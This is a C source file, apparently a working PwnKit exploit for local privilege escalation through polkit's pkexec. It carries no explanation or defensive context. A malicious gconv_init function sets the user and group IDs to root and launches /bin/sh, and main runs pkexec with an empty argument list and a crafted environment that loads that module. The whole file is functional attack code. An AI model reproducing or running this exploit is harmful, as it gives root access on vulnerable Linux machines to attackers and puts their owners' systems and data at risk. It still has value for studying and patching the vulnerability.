#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv() {}

void gconv_init(void *step) {
    char * const args[] = { "/bin/sh", NULL };
    char * const environ[] = { "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/bin", NULL };
    setuid(0);
    setgid(0);
    execve(args[0], args, environ);
    exit(0);
}

int main(int argc, char **argv) {
    char * const args[] = { NULL };
    char * const environ[] = {
        "pwnkit.so:.",
        "PATH=GCONV_PATH=.",
        "SHELL=/lol/i/do/not/exists",
        "CHARSET=PWNKIT",
        "GIO_USE_VFS=",
        NULL
    };
    execve("/usr/bin/pkexec", args, environ);
    return 0;
}
